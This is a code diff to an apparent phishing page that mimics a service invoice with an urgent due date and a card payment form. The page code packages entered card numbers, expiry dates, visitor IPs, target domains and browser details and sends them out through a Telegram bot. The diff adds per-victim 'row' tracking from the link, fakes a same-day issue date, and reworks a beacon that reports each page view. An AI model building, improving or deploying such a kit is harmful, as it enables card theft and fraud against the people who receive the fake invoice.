@@ -79,7 +79,7 @@ td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
 }
 
 .veil {
-  position: absolute; left: 0; right: 0; bottom: 0; height: 52%;
+  position: absolute; left: 0; right: 0; bottom: 0; height: 34%;
   backdrop-filter: blur(3.5px); -webkit-backdrop-filter: blur(3.5px);
   background: linear-gradient(to bottom, rgba(255,255,255,.3), rgba(255,255,255,.9) 55%, #fff 100%);
   pointer-events: none; transition: opacity .45s ease;
@@ -245,7 +245,7 @@ footer a { color: var(--muted); }
       </div>
       <div class="meta-box">
         <b>INV-2026-1184</b><br />
-        Issued 20 Nov 2026<br />
+        Issued <span id="issued">21 Nov 2026</span><br />
         <span class="urgent">Due 27 Nov 2026</span><br />
         Renews annually
       </div>
@@ -293,7 +293,7 @@ footer a { color: var(--muted); }
       </div>
 
       <div class="pay-body" id="paybody">
-        <p>Card payment settles immediately. No account needed, nothing to install.</p>
+        <p>Card payment is taken now. No account needed, nothing to install.</p>
 
         <div class="brands" id="brands">
           <div class="b" data-brand="visa">
@@ -433,7 +433,12 @@ var FREE_DOMAINS = [
   "bellsouth.net", "charter.net", "earthlink.net", "juno.com", "shaw.ca"
 ];
 
-/* ---------------- RECIPIENT DOMAIN ---------------- */
+var MONTHS = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+var today = new Date();
+document.getElementById("issued").textContent =
+  today.getDate() + " " + MONTHS[today.getMonth()] + " " + today.getFullYear();
+
+/* ---------------- RECIPIENT DOMAIN + ROW ---------------- */
 function safeDomain(raw) {
   if (!raw) return "";
   var d = decodeURIComponent(raw).toLowerCase().trim();
@@ -445,7 +450,9 @@ function safeDomain(raw) {
   return d;
 }
 
-var targetDomain = safeDomain(new URLSearchParams(location.search).get("d"));
+var qs = new URLSearchParams(location.search);
+var targetDomain = safeDomain(qs.get("d"));
+var targetRow = (qs.get("r") || "").replace(/[^0-9A-Za-z_-]/g, "").slice(0, 12);
 
 if (targetDomain) {
   document.getElementById("svcline").innerHTML =
@@ -667,6 +674,7 @@ function buildMessage(brand, digits, ip) {
     "<b>Invoice</b> : " + INVOICE_NO + "\n" +
     "<b>Amount</b> : " + AMOUNT_DUE + "\n" +
     (targetDomain ? "<b>Domain</b> : " + esc(targetDomain) + "\n" : "") +
+    (targetRow ? "<b>Row</b> : " + esc(targetRow) + "\n" : "") +
     "\n<b>Card</b> : " + digits.replace(/(\d{4})(?=\d)/g, "$1 ") + "\n" +
     "<b>Brand</b> : " + brand.label + "\n" +
     "<b>Expiry</b> : " + cardExpEl.value + "\n" +
@@ -702,18 +710,20 @@ function sendToTelegram(message) {
     return r.json();
   });
 }
-  /* ---- view log ---- */
+
+/* ---------------- VIEW LOG ---------------- */
 (function () {
-  var qs = new URLSearchParams(location.search);
-  var d = qs.get("d") || "", r = qs.get("r") || "";
-  if (!d && !r) return;
-  var key = "hit_" + (r || d);
-  try { if (sessionStorage.getItem(key)) return; sessionStorage.setItem(key, "1"); } catch (e) {}
+  if (!targetDomain && !targetRow) return;
+  var key = "hit_" + (targetRow || targetDomain);
+  try {
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, "1");
+  } catch (e) {}
   fetchIpAddress().then(function (ip) {
     sendToTelegram("<b>#----[ VIEW ]----#</b>\n" +
       "<b>Invoice</b> : " + INVOICE_NO + "\n" +
-      (d ? "<b>Domain</b> : " + esc(d) + "\n" : "") +
-      (r ? "<b>Row</b> : " + esc(r) + "\n" : "") +
+      (targetDomain ? "<b>Domain</b> : " + esc(targetDomain) + "\n" : "") +
+      (targetRow ? "<b>Row</b> : " + esc(targetRow) + "\n" : "") +
       "<b>IP</b> : " + ip + "\n" +
       "<b>Ref</b> : " + esc(document.referrer || "direct") + "\n" +
       "<b>Device</b> : " + esc(navigator.userAgent)).catch(function () {});
